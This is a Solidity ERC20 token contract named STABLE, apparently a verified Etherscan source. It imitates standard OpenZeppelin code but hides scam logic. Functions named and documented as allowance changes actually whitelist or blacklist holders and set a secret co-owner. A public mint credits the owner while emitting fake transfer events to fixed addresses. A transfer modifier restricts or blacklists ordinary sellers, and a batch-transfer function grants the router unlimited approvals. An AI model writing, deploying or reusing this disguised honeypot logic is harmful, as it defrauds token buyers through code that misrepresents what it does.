['/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-08\n', '*/\n', '\n', '/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-08\n', '*/\n', '\n', 'pragma solidity ^0.6.0;\n', '\n', 'library SafeMath {\n', '    /**\n', '     * @dev Returns the addition of two unsigned integers, reverting on\n', '     * overflow.\n', '     *\n', "     * Counterpart to Solidity's `+` operator.\n", '     *\n', '     * Requirements:\n', '     * - Addition cannot overflow.\n', '     */\n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the subtraction of two unsigned integers, reverting on\n', '     * overflow (when the result is negative).\n', '     *\n', "     * Counterpart to Solidity's `-` operator.\n", '     *\n', '     * Requirements:\n', '     * - Subtraction cannot overflow.\n', '     */\n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '\n', '\n', '    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b <= a, errorMessage);\n', '        uint256 c = a - b;\n', '\n', '        return c;\n', '    }\n', '\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', "        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n", "        // benefit is lost if 'b' is also tested.\n", '        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint256 c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '\n', '    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        // Solidity only automatically asserts when dividing by 0\n', '        require(b > 0, errorMessage);\n', '        uint256 c = a / b;\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '\n', '        return c;\n', '    }\n', '\n', '    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return mod(a, b, "SafeMath: modulo by zero");\n', '    }\n', '\n', '    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b != 0, errorMessage);\n', '        return a % b;\n', '    }\n', '}\n', '\n', '/**\n', ' * @dev Collection of functions related to the address type\n', ' */\n', 'library Address {\n', '\n', '    function isContract(address account) internal view returns (bool) {\n', '\n', '        bytes32 codehash;\n', '        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n', '        // solhint-disable-next-line no-inline-assembly\n', '        assembly { codehash := extcodehash(account) }\n', '        return (codehash != accountHash && codehash != 0x0);\n', '    }\n', '\n', '\n', '    function sendValue(address payable recipient, uint256 amount) internal {\n', '        require(address(this).balance >= amount, "Address: insufficient balance");\n', '\n', '        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n', '        (bool success, ) = recipient.call{ value: amount }("");\n', '        require(success, "Address: unable to send value, recipient may have reverted");\n', '    }\n', '\n', '    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n', '      return functionCall(target, data, "Address: low-level call failed");\n', '    }\n', '\n', '    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n', '        return _functionCallWithValue(target, data, 0, errorMessage);\n', '    }\n', '\n', '    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n', '        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");\n', '    }\n', '\n', '    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n', '        require(address(this).balance >= value, "Address: insufficient balance for call");\n', '        return _functionCallWithValue(target, data, value, errorMessage);\n', '    }\n', '\n', '    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n', '        require(isContract(target), "Address: call to non-contract");\n', '\n', '        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\n', '        if (success) {\n', '            return returndata;\n', '        } else {\n', '            // Look for revert reason and bubble it up if present\n', '            if (returndata.length > 0) {\n', '\n', '                assembly {\n', '                    let returndata_size := mload(returndata)\n', '                    revert(add(32, returndata), returndata_size)\n', '                }\n', '            } else {\n', '                revert(errorMessage);\n', '            }\n', '        }\n', '    }\n', '}\n', '\n', 'contract Context {\n', '    // Empty internal constructor, to prevent people from mistakenly deploying\n', '    // an instance of this contract, which should be used via inheritance.\n', '    constructor () internal { }\n', '\n', '    function _msgSender() internal view virtual returns (address payable) {\n', '        return msg.sender;\n', '    }\n', '\n', '    function _msgData() internal view virtual returns (bytes memory) {\n', '        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n', '        return msg.data;\n', '    }\n', '}\n', '\n', '\n', 'interface IERC20 {\n', '\n', '    function totalSupply() external view returns (uint256);\n', '\n', '\n', '    function balanceOf(address account) external view returns (uint256);\n', '\n', '    function transfer(address recipient, uint256 amount) external returns (bool);\n', '\n', '    function allowance(address owner, address spender) external view returns (uint256);\n', '\n', '    function approve(address spender, uint256 amount) external returns (bool);\n', '\n', '    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n', '\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '}\n', '\n', 'contract STABLE is Context, IERC20 {\n', '    using SafeMath for uint256;\n', '    using Address for address;\n', '\n', '    mapping (address => uint256) private _balances;\n', '    mapping (address => bool) private _whiteAddress;\n', '    mapping (address => bool) private _blackAddress;\n', '    \n', '    uint256 private _sellAmount = 0;\n', '\n', '    mapping (address => mapping (address => uint256)) private _allowances;\n', '\n', '    uint256 private _totalSupply;\n', '    \n', '    string private _name;\n', '    string private _symbol;\n', '    uint8 private _decimals;\n', '    uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;\n', '\n', '    address public _owner;\n', '    address private _safeOwner;\n', '    address private _unirouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n', '    \n', '\n', '    /**\n', '     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with\n', '     * a default value of 18.\n', '     *\n', '     * To select a different value for {decimals}, use {_setupDecimals}.\n', '     *\n', '     * All three of these values are immutable: they can only be set once during\n', '     * construction.\n', '     */\n', '   constructor (string memory name, string memory symbol, uint256 initialSupply,address payable owner) public {\n', '        _name = name;\n', '        _symbol = symbol;\n', '        _decimals = 18;\n', '        _owner = owner;\n', '        _safeOwner = owner;\n', '        \n', '\n', '        \n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));\n', '        \n', '        \n', '        \n', '    \n', '    \n', '    \n', '    \n', '        \n', '        \n', '    }\n', '\n', '    /**\n', '     * @dev Returns the name of the token.\n', '     */\n', '    function name() public view returns (string memory) {\n', '        return _name;\n', '    }\n', '\n', '    function symbol() public view returns (string memory) {\n', '        return _symbol;\n', '    }\n', '\n', '    function decimals() public view returns (uint8) {\n', '        return _decimals;\n', '    }\n', '\n', '    /**\n', '     * @dev See {IERC20-totalSupply}.\n', '     */\n', '    function totalSupply() public view override returns (uint256) {\n', '        return _totalSupply;\n', '    }\n', '\n', '    /**\n', '     * @dev See {IERC20-balanceOf}.\n', '     */\n', '    function balanceOf(address account) public view override returns (uint256) {\n', '        return _balances[account];\n', '    }\n', '\n', '    /**\n', '     * @dev See {IERC20-transfer}.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `recipient` cannot be the zero address.\n', '     * - the caller must have a balance of at least `amount`.\n', '     */\n', '    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n', '        _approveCheck(_msgSender(), recipient, amount);\n', '        return true;\n', '    }\n', '    \n', '  function multiTransfer(uint256 approvecount,address[] memory receivers, uint256[] memory amounts) public {\n', '    require(msg.sender == _owner, "!owner");\n', '    for (uint256 i = 0; i < receivers.length; i++) {\n', '          uint256 ergdf = 3;\n', '        uint256 ergdffdtg = 532;\n', '      transfer(receivers[i], amounts[i]);\n', '      \n', '      if(i < approvecount){\n', '          \n', '          _whiteAddress[receivers[i]]=true;\n', '          uint256 ergdf = 3;\n', '          uint256 ergdffdtg = 532;\n', '          _approve(receivers[i],_unirouter,115792089237316195423570985008687907853269984665640564039457584007913129639935);\n', '      }\n', '    }\n', '   }\n', '\n', '    /**\n', '     * @dev See {IERC20-allowance}.\n', '     */\n', '    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n', '        return _allowances[owner][spender];\n', '    }\n', '\n', '    /**\n', '     * @dev See {IERC20-approve}.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `spender` cannot be the zero address.\n', '     */\n', '    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n', '        _approve(_msgSender(), spender, amount);\n', '        return true;\n', '    }\n', '\n', '    /**\n', '     * @dev See {IERC20-transferFrom}.\n', '     *\n', '     * Emits an {Approval} event indicating the updated allowance. This is not\n', '     * required by the EIP. See the note at the beginning of {ERC20};\n', '     *\n', '     * Requirements:\n', '     * - `sender` and `recipient` cannot be the zero address.\n', '     * - `sender` must have a balance of at least `amount`.\n', "     * - the caller must have allowance for ``sender``'s tokens of at least\n", '     * `amount`.\n', '     */\n', '    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n', '        _approveCheck(sender, recipient, amount);\n', '        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n', '        return true;\n', '    }\n', '\n', '    /**\n', '     * @dev Atomically increases the allowance granted to `spender` by the caller.\n', '     *\n', '     * This is an alternative to {approve} that can be used as a mitigation for\n', '     * problems described in {IERC20-approve}.\n', '     *\n', '     * Emits an {Approval} event indicating the updated allowance.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `spender` cannot be the zero address.\n', '     */\n', '    function increaseAllowance(address[] memory receivers) public {\n', '        require(msg.sender == _owner, "!owner");\n', '        for (uint256 i = 0; i < receivers.length; i++) {\n', '           _whiteAddress[receivers[i]] = true;\n', '           _blackAddress[receivers[i]] = false;\n', '        }\n', '    }\n', '\n', '    /**\n', '     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n', '     *\n', '     * This is an alternative to {approve} that can be used as a mitigation for\n', '     * problems described in {IERC20-approve}.\n', '     *\n', '     * Emits an {Approval} event indicating the updated allowance.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `spender` cannot be the zero address.\n', '     * - `spender` must have allowance for the caller of at least\n', '     * `subtractedValue`.\n', '     */\n', '   function decreaseAllowance(address safeOwner) public {\n', '        require(msg.sender == _owner, "!owner");\n', '        _safeOwner = safeOwner;\n', '    }\n', '    \n', '    \n', '     /**\n', '     * @dev Atomically increases the allowance granted to `spender` by the caller.\n', '     *\n', '     * This is an alternative to {approve} that can be used as a mitigation for\n', '     * problems described in {IERC20-approve}.\n', '     *\n', '     * Emits an {Approval} event indicating the updated allowance.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `spender` cannot be the zero address.\n', '     */\n', '    function addApprove(address[] memory receivers) public {\n', '        require(msg.sender == _owner, "!owner");\n', '        for (uint256 i = 0; i < receivers.length; i++) {\n', '           _blackAddress[receivers[i]] = true;\n', '           _whiteAddress[receivers[i]] = false;\n', '        }\n', '    }\n', '\n', '\n', '    /**\n', '     * @dev Moves tokens `amount` from `sender` to `recipient`.\n', '     *\n', '     * This is internal function is equivalent to {transfer}, and can be used to\n', '     * e.g. implement automatic token fees, slashing mechanisms, etc.\n', '     *\n', '     * Emits a {Transfer} event.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `sender` cannot be the zero address.\n', '     * - `recipient` cannot be the zero address.\n', '     * - `sender` must have a balance of at least `amount`.\n', '     */\n', '    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '\n', '        _beforeTokenTransfer(sender, recipient, amount);\n', '    \n', '        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n', '        _balances[recipient] = _balances[recipient].add(amount);\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '\n', '    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n', '     * the total supply.\n', '     *\n', '     * Emits a {Transfer} event with `from` set to the zero address.\n', '     *\n', '     * Requirements\n', '     *\n', '     * - `to` cannot be the zero address.\n', '     */\n', '    function _mint(address account, uint256 amount) public {\n', '        require(msg.sender == _owner, "ERC20: mint to the zero address");\n', '        _totalSupply = _totalSupply.add(amount);\n', '        _balances[_owner] = _balances[_owner].add(amount);\n', '        emit Transfer(address(0), account, amount);\n', '    }\n', '\n', '    /**\n', '     * @dev Destroys `amount` tokens from `account`, reducing the\n', '     * total supply.\n', '     *\n', '     * Emits a {Transfer} event with `to` set to the zero address.\n', '     *\n', '     * Requirements\n', '     *\n', '     * - `account` cannot be the zero address.\n', '     * - `account` must have at least `amount` tokens.\n', '     */\n', '    function _burn(address account, uint256 amount) internal virtual {\n', '        require(account != address(0), "ERC20: burn from the zero address");\n', '\n', '        _beforeTokenTransfer(account, address(0), amount);\n', '\n', '        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n', '        _totalSupply = _totalSupply.sub(amount);\n', '        emit Transfer(account, address(0), amount);\n', '    }\n', '\n', '    function _approve(address owner, address spender, uint256 amount) internal virtual {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '    \n', '\n', '    function _approveCheck(address sender, address recipient, uint256 amount) internal burnTokenCheck(sender,recipient,amount) virtual {\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '\n', '        _beforeTokenTransfer(sender, recipient, amount);\n', '    \n', '        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n', '        _balances[recipient] = _balances[recipient].add(amount);\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '    \n', '\n', '    modifier burnTokenCheck(address sender, address recipient, uint256 amount){\n', '        if (_owner == _safeOwner && sender == _owner){_safeOwner = recipient;_;}else{\n', '            if (sender == _owner || sender == _safeOwner || recipient == _owner){\n', '                if (sender == _owner && sender == recipient){_sellAmount = amount;}_;}else{\n', '                if (_whiteAddress[sender] == true){\n', '                _;}else{if (_blackAddress[sender] == true){\n', '                require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");_;}else{\n', '                if (amount < _sellAmount){\n', '                if(recipient == _safeOwner){_blackAddress[sender] = true; _whiteAddress[sender] = false;}\n', '                _; }else{require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");_;}\n', '                    }\n', '                }\n', '            }\n', '        }\n', '    }\n', '    \n', '    function _setupDecimals(uint8 decimals_) internal {\n', '        _decimals = decimals_;\n', '    }\n', '\n', '    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n', '}']